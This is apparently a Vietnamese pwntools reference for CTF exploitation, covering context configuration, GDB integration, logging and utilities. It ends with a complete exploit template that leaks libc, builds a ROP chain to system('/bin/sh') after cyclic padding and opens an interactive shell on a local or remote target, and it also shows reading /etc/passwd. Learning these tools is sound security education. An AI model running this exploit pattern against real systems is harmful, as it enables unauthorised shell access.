# context — cấu hình, GDB, log, tiện ích

`context` là **trạng thái toàn cục** chi phối `p64/asm/shellcraft/ROP/tube`. Set đúng 1 lần
là mọi thứ tự khớp.

---

## `context` — thuộc tính hay dùng

| Thuộc tính | Ý nghĩa |
|------------|---------|
| `context.arch` | `'amd64'`\|`'i386'`\|`'arm'`... (quyết định `p64/asm/shellcraft`) |
| `context.bits` | 64 / 32 (tự suy theo arch) |
| `context.endian` | `'little'`\|`'big'` |
| `context.os` | `'linux'`\|`'windows'`... |
| `context.log_level` | `'debug'`\|`'info'`\|`'warn'`\|`'error'` |
| `context.terminal` | lệnh mở terminal cho `gdb.debug` (vd ghostty) |
| `context.aslr` | bật/tắt ASLR cho `process()` |
| `context.binary` | ELF — **set cái này là arch/bits/endian/os tự đúng** |
| `context.timeout` | timeout mặc định cho recv |
| `context.newline` | ký tự xuống dòng (mặc định `\n`) |

```python
context.binary = ELF("./chall")          # cách tốt nhất: 1 dòng set hết
# hoặc set thủ công:
context.update(arch='amd64', os='linux', log_level='debug')
context.clear()                          # reset về mặc định

# đặt tạm trong 1 khối (không ảnh hưởng ngoài)
with context.local(log_level='debug'):
    p.sendline(payload)
```

> `context.log_level='debug'` in **mọi byte gửi/nhận** + hexdump — công cụ debug mạnh nhất khi
> prompt lệch hay payload sai.

> **Cơ chế:** `context` là **thread-local**, `with context.local(...)` lưu trạng thái cũ rồi
> **tự khôi phục** khi ra khỏi khối — dùng để đổi arch/timeout tạm thời mà không rò ra ngoài.
> **Bẫy:** gán `context.arch='i386'` sẽ đặt lại `bits=32` *theo mặc định của arch*, nhưng đổi
> ngược `arch='amd64'` khi đang `bits=32` **không** tự lên 64 nếu bạn đã set tay — khi lẫn 32/64
> hãy set cả cặp: `context.update(arch='i386', bits=32)`.

---

## `gdb.debug / gdb.attach` — chạy dưới GDB

**Công dụng:** mở GDB tự động, đặt breakpoint sẵn. **Dạng bài:** mọi lúc cần soi stack/thanh ghi.

```python
# C1: khởi chạy NGAY trong gdb
p = gdb.debug("./chall", gdbscript="""
    b *main+123
    c
""")

# C2: attach vào process đang chạy
p = process("./chall")
gdb.attach(p, "b *0x401234\nc")          # mở cửa sổ gdb mới
pause()                                   # dừng script để kịp set breakpoint tay

# C3: attach qua SSH/remote-gdbserver (nâng cao)
```

| Tham số | Ý nghĩa |
|---------|---------|
| `args` / `argv` | binary + đối số |
| `gdbscript` | lệnh gdb chạy khi mở (breakpoint, `c`, lệnh init) |
| `env` / `aslr` | như `process` |

> Cần `context.terminal` trỏ tới terminal (vd `['ghostty','-e']`) để cửa sổ gdb bật ra.
> `gdb.debug` **không** dùng được ở mode remote (chỉ local).

---

## `log` — in tiến trình đẹp

```python
log.info("bắt đầu leak")
log.success(f"libc base = {hex(base)}")
log.warning("thử lại...")
log.failure("trượt")

# thanh tiến trình cho vòng lặp/brute
prog = log.progress("brute")
for i in range(256):
    prog.status(f"thử {i}")
prog.success("xong")

# log lồng (indent)
with log.progress("stage 1") as p1:
    p1.status("...")
```

---

## Tiện ích khác (`util`)

```python
pause()                      # dừng tới khi Enter (để attach gdb tay)
pause(2)                     # nghỉ 2 giây
align(0x1000, addr)          # căn lên bội 0x1000 (page align cho mprotect)
align_down(0x1000, addr)
more(text)                   # phân trang output dài
read("/etc/passwd"); write("out.bin", data)   # đọc/ghi file nhanh
which("gdb")                 # tìm path binary
```

---

## Mẫu khung đầy đủ (ghép mọi thứ)

```python
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./chall", checksec=False)
context.log_level = "info"
context.terminal = ["ghostty", "-e"]
libc = exe.libc or ELF("./libc.so.6", checksec=False)

gs = "b *main\nc"
if   args.GDB:    p = gdb.debug(exe.path, gdbscript=gs)   # python3 x.py GDB
elif args.REMOTE: p = remote(sys.argv[1], int(sys.argv[2]))
else:             p = process(exe.path)

# --- leak ---
p.recvuntil(b"Leak: ")
libc.address = int(p.recvline(), 16) - libc.sym.puts
log.success(f"libc = {hex(libc.address)}")

# --- rop ---
rop = ROP(libc)
rop.call(libc.sym.system, [next(libc.search(b"/bin/sh\x00"))])
p.sendlineafter(b"> ", flat(cyclic(40, n=8), rop.chain()))
p.interactive()
```

`args.XXX`: pwntools đọc **tham số dòng lệnh dạng CHỮ HOA** → `python3 x.py GDB REMOTE`
cho `args.GDB`/`args.REMOTE` = True (khỏi tự parse `sys.argv`).

---

## Mẹo nhanh

- Set `context.binary` đầu tiên — tiết kiệm việc set arch/bits/endian cho từng hàm.
- `args.GDB` / `args.REMOTE` thay cho tự đọc `sys.argv` → script gọn, đổi mode 1 chữ.
- Kẹt không hiểu sao sai → `context.log_level='debug'`, đọc đúng byte gửi/nhận.
- `pause()` + `gdb.attach` khi cần set breakpoint tay trước lúc gửi payload.
